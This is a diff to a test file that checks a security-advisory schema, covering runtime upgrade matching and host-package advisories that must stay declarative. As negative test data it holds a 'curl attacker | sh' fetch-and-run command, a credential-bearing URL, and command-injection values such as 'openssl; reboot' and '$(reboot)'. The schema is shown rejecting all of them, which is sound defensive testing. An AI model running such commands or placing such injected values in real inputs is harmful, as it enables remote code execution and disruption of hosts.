@@ -2,6 +2,8 @@ import publishedAdvisories from "../../../security-advisories.json";
 import { describe, expect, it } from "vitest";
 import {
   SecurityManifestSchema,
+  SecurityAdvisorySchema,
+  securityAdvisoryAppliesToMode,
   matchSecurityAdvisories,
   securityImageIdentity,
 } from "../src/updates/security";
@@ -104,7 +106,11 @@ describe("declarative security advisories", () => {
     const notice = manifest.advisories[0]!;
     for (const bad of [
       { ...notice, command: "curl attacker | sh" },
-      { ...notice, action: "refresh-images", targets: [{ kind: "runtime", runtime: "php", affected: "<=8.4.27", fixed: null }] },
+      {
+        ...notice,
+        action: "refresh-images",
+        targets: [{ kind: "runtime", runtime: "php", affected: "<=8.4.27", fixed: null }],
+      },
       { ...notice, url: "https://user:secret@example.com" },
       {
         ...notice,
@@ -149,6 +155,23 @@ describe("published October runtime guidance", () => {
     expiresAt: "2026-10-25T00:00:00.000Z",
     ...publishedAdvisories,
   });
+  it("requires an explicit major upgrade for Node 20 instead of another ineffective image refresh", () => {
+    const matches = matchSecurityAdvisories(
+      feed,
+      [],
+      [
+        { runtime: "node", serviceId: null, version: "20.20.2" },
+        { runtime: "node", serviceId: "patchable", version: "22.23.3" },
+      ],
+    );
+    expect(matches.find((match) => match.serviceId === null)).toMatchObject({
+      runtimeUpgradeRequired: true,
+      evidence: "node 20.20.2",
+    });
+    expect(
+      matches.find((match) => match.serviceId === "patchable")?.runtimeUpgradeRequired,
+    ).not.toBe(true);
+  });
   it.each([
     ["8.2.34", "8.2.35"],
     ["8.3.35", "8.3.36"],
@@ -179,4 +202,73 @@ describe("published October runtime guidance", () => {
     expect(matches(old).map((m) => m.advisory.id)).toEqual(["CVE-2026-111497-node"]);
     expect(matches(fixed)).toEqual([]);
   });
+});
+
+// Host instructions remain declarative and cannot acquire the project deployment action.
+describe("host advisory boundary", () => {
+  const host = {
+    id: "host-fixture",
+    revision: 1,
+    title: "Ubuntu package update",
+    message: "Fixture",
+    severity: "high",
+    url: "https://ubuntu.com/security",
+    publishedAt: "2026-01-01T00:00:00Z",
+    action: "patch-host",
+    modes: ["selfhosted"],
+    targets: [
+      {
+        kind: "host-package",
+        distribution: "ubuntu",
+        release: "24.04",
+        package: "openssl",
+        fixedVersion: "3.0.13-0ubuntu3.5",
+      },
+    ],
+  };
+  it("validates host scope and rejects executable content or cross-scope actions", () => {
+    expect(SecurityAdvisorySchema.safeParse(host).success).toBe(true);
+    expect(SecurityAdvisorySchema.safeParse({ ...host, command: "reboot" }).success).toBe(false);
+    expect(SecurityAdvisorySchema.safeParse({ ...host, action: "refresh-images" }).success).toBe(
+      false,
+    );
+    expect(
+      SecurityAdvisorySchema.safeParse({
+        ...host,
+        targets: [{ ...host.targets[0], package: "openssl; reboot" }],
+      }).success,
+    ).toBe(false);
+    expect(
+      SecurityAdvisorySchema.safeParse({
+        ...host,
+        targets: [{ ...host.targets[0], fixedVersion: "$(reboot)" }],
+      }).success,
+    ).toBe(false);
+    expect(
+      SecurityAdvisorySchema.safeParse({
+        ...host,
+        targets: [{ kind: "runtime", runtime: "node", affected: "<22", fixed: ">=22" }],
+      }).success,
+    ).toBe(false);
+    const kernel = { ...host.targets[0], package: "linux-generic" };
+    expect(SecurityAdvisorySchema.safeParse({ ...host, targets: [kernel] }).success).toBe(false);
+    expect(
+      SecurityAdvisorySchema.safeParse({
+        ...host,
+        targets: [
+          {
+            ...kernel,
+            runningKernel: { sourcePackage: "linux-signed", fixedVersion: "6.8.0-117.117" },
+          },
+        ],
+      }).success,
+    ).toBe(true);
+  });
+});
+
+it("filters advisory modes without changing the signed feed", () => {
+  const notice = SecurityAdvisorySchema.parse({ ...manifest.advisories[0], modes: ["selfhosted"] });
+  expect(securityAdvisoryAppliesToMode(notice, "selfhosted")).toBe(true);
+  expect(securityAdvisoryAppliesToMode(notice, "cloud")).toBe(false);
+  expect(securityAdvisoryAppliesToMode(notice, "desktop")).toBe(false);
 });
